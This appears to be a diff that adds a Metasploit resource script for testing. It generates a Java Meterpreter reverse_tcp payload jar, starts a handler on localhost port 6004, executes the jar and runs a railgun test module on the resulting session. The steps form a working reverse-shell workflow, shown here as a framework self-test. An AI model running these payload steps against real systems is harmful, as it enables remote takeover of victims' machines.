@@ -1,0 +1,23 @@
+## Load test modules
+loadpath test/modules
+
+## Payload
+use java/meterpreter/reverse_tcp
+
+## Set global datastore
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/javameterpreterreverse_tcp_session_tlv_logging20240307-2901-cg19cxtxt
+
+## Generate command
+generate -o /tmp/child-process-rb-java-meterpreter-reverse-tcp20240307-2901-nbk03d.jar -f jar AutoVerifySessionTimeout=30 lport=6004 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/javameterpreterreverse_tcp_debug_log20240307-2901-p08tv7txt spawn=0
+
+## Create listener
+to_handler AutoVerifySessionTimeout=30 lport=6004 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/javameterpreterreverse_tcp_debug_log20240307-2901-p08tv7txt spawn=0
+
+## Execute command
+java -jar /tmp/child-process-rb-java-meterpreter-reverse-tcp20240307-2901-nbk03d.jar
+
+
+## Replication commands
+use test/railgun
+run session=4 AddEntropy=true Verbose=true
